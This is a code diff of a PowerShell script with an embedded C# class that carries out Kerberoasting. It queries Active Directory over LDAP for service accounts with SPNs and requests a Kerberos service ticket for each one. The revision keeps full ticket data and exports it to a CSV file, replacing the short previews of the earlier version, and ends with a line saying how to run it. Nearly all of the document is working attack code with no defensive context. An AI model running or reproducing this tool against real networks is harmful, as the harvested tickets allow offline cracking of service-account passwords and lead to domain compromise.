@@ -1,4 +1,3 @@
-# STEP 1: Load C# class to get Kerberos TGS tickets
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -73,10 +72,31 @@ public class K {
             desc.cBuffers = 1;
             desc.pBuffers = bufPtr;
 
-            if (AcquireCredentialsHandle(null, "Kerberos", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
+            if (AcquireCredentialsHandle(
+                    null,
+                    "Kerberos",
+                    0x00000002,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    out cred,
+                    out expiry1) != 0)
                 return "";
 
-            if (InitializeSecurityContext(cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, out desc, out attr, out expiry2) != 0)
+            if (InitializeSecurityContext(
+                    cred,
+                    IntPtr.Zero,
+                    spn,
+                    0x00001000,
+                    0,
+                    16,
+                    IntPtr.Zero,
+                    0,
+                    out ctx,
+                    out desc,
+                    out attr,
+                    out expiry2) != 0)
                 return "";
 
             SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
@@ -100,147 +120,81 @@ public class K {
 }
 "@
 
-# STEP 2: Query AD for service accounts with SPNs
 function Get-AdServiceAccountsV2 {
-    [CmdletBinding()]
-    Param(
-        [string[]] $Identity,
-        [switch]   $AdminsOnly,
-        [string]   $Domain,
-        [string]   $LdapFilter,
-        [string]   $Scope = 'Subtree',
-        [int]      $PageSize = 200,
-        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
+    Param (
+        [string] $Domain,
+        [int] $PageSize = 200
     )
 
     $dnsDomain = if ($Domain) { $Domain } else { $env:USERDNSDOMAIN }
     if (-not $dnsDomain) { throw "Could not resolve DNS domain. Provide -Domain." }
+
     $baseDn = "DC=$($dnsDomain -replace '\.',',DC=')"
     $ldapPath = "LDAP://$baseDn"
-
-    $de = if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
-        New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
-    } else {
-        New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-    }
-
-    $idOr = ''
-    if ($Identity) {
-        foreach ($n in $Identity) {
-            if ($n -match '^S-1-')      { $idOr += "(objectSid=$n)" }
-            elseif ($n -match '^CN=')   { $idOr += "(distinguishedName=$n)" }
-            elseif ($n -match '^[0-9a-fA-F-]{32,}$') { $idOr += "(objectGuid=$n)" }
-            else                        { $idOr += "(sAMAccountName=$n)" }
-        }
-        if ($idOr) { $idOr = "(|$idOr)" }
-    }
-
-    $filter  = "(&(samAccountType=805306368)(servicePrincipalName=*)"
-    if ($idOr)      { $filter += $idOr }
-    if ($AdminsOnly){ $filter += "(adminCount=1)" }
-    if ($LdapFilter){ $filter += $LdapFilter }
-    $filter += ")"
-
+    $de = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
     $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
-    $ds.PageSize     = $PageSize
-    $ds.SearchScope  = $Scope
+    $ds.PageSize = $PageSize
+    $ds.SearchScope = "Subtree"
     $ds.CacheResults = $false
-    $ds.Filter       = $filter
-
-    $props = @('distinguishedName','sAMAccountName','servicePrincipalName','objectSid','objectGuid','pwdLastSet','lastLogonTimestamp','userPrincipalName','memberOf')
+    $ds.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
+    $props = @('sAMAccountName','servicePrincipalName','distinguishedName')
     foreach ($p in $props) { [void]$ds.PropertiesToLoad.Add($p) }
 
     try {
         $results = $ds.FindAll()
-        foreach ($r in $results) {
-            $z = $r.Properties
-            $obj = New-Object PSObject
-            $obj | Add-Member NoteProperty SamAccountName        ($z['samaccountname'][0])
-            $obj | Add-Member NoteProperty DistinguishedName     ($z['distinguishedname'][0])
-            $obj | Add-Member NoteProperty UserPrincipalName     ($z['userprincipalname'][0])
-            $obj | Add-Member NoteProperty ServicePrincipalName  ($z['serviceprincipalname'])
-
-            if ($z['objectsid']) {
-                $obj | Add-Member NoteProperty ObjectSid (New-Object System.Security.Principal.SecurityIdentifier($z['objectsid'][0],0)).Value
-            }
-            if ($z['objectguid']) {
-                $guid = New-Object Guid (,$z['objectguid'][0])
-                $obj | Add-Member NoteProperty ObjectGuid $guid.Guid
-            }
-            if ($z['pwdlastset']) {
-                $obj | Add-Member NoteProperty PwdLastSet ([datetime]::FromFileTime([int64]$z['pwdlastset'][0]))
-            }
-            if ($z['lastlogontimestamp']) {
-                $obj | Add-Member NoteProperty LastLogonTimestamp ([datetime]::FromFileTime([int64]$z['lastlogontimestamp'][0]))
-            }
-
-            $obj
-        }
-    } finally {
-        if ($ds) { $ds.Dispose() }
-        if ($de) { $de.Dispose() }
-        if ($results) { $results.Dispose() }
+    } catch {
+        Write-Error "LDAP search failed: $_"
+        return
     }
+
+    foreach ($r in $results) {
+        $z = $r.Properties
+        $spns = $z['serviceprincipalname']
+        if ($spns) {
+            foreach ($spn in $spns) {
+                [PSCustomObject]@{
+                    SamAccountName       = $z['samaccountname'][0]
+                    DistinguishedName    = $z['distinguishedname'][0]
+                    SPN                  = $spn
+                }
+            }
+        }
+    }
+
+    $ds.Dispose()
+    $de.Dispose()
 }
 
-# STEP 3: Request TGS tickets for all SPNs
 function Get-KerberosTicketsForAllSPNs {
-    [CmdletBinding()]
-    Param(
-        [switch]$OnlySuccess,
-        [switch]$ExportToCsv,
-        [string]$CsvPath = ".\kerberos_tickets.csv",
-        [string]$Domain,
-        [string]$Scope = "Subtree"
+    Param (
+        [switch] $ExportToCsv
     )
 
-    $accounts = Get-AdServiceAccountsV2 -Domain:$Domain -Scope:$Scope
-    $results = @()
+    $results = Get-AdServiceAccountsV2
+    $tickets = @()
 
-    foreach ($acct in $accounts) {
-        $sam = $acct.SamAccountName
-        $dn  = $acct.DistinguishedName
-        $spns = $acct.ServicePrincipalName
-
-        foreach ($spn in $spns) {
-            try {
-                Write-Host "Requesting TGS for SPN: $spn" -ForegroundColor Cyan
-                $ticket = [K]::GetTicket($spn)
-
-                $result = [PSCustomObject]@{
-                    SamAccountName     = $sam
-                    DistinguishedName  = $dn
-                    SPN                = $spn
-                    GotTicket          = $false
-                    TicketPreview      = ''
-                }
-
-                if ($ticket -and $ticket.Length -gt 0) {
-                    $result.GotTicket = $true
-                    $result.TicketPreview = $ticket.Substring(0, 48) + '...'
-                    Write-Host "[+] Success: $spn" -ForegroundColor Green
-                } else {
-                    Write-Host "[-] Failed : $spn" -ForegroundColor DarkGray
-                }
-
-                if (-not $OnlySuccess -or $result.GotTicket) {
-                    $results += $result
-                }
-
-            } catch {
-                Write-Warning "Exception for SPN $spn: $_"
+    foreach ($r in $results) {
+        Write-Host "`nRequesting TGS for SPN: $($r.SPN)"
+        try {
+            $ticket = [K]::GetTicket($r.SPN)
+            $obj = [PSCustomObject]@{
+                Account = $r.SamAccountName
+                SPN     = $r.SPN
+                Ticket  = $ticket
             }
+            $tickets += $obj
+        } catch {
+            Write-Warning "Failed to get ticket for SPN $($r.SPN): $_"
         }
     }
 
     if ($ExportToCsv) {
-        try {
-            $results | Export-Csv -NoTypeInformation -Encoding UTF8 -Path $CsvPath
-            Write-Host "`n[+] Exported to $CsvPath" -ForegroundColor Yellow
-        } catch {
-            Write-Warning "Failed to export results: $_"
-        }
+        $tickets | Export-Csv "KerberosTickets.csv" -NoTypeInformation -Encoding UTF8
+        Write-Host "`nTickets exported to KerberosTickets.csv"
+    } else {
+        $tickets
     }
-
-    return $results
 }
+
+# Run this to start:
+# Get-KerberosTicketsForAllSPNs -ExportToCsv
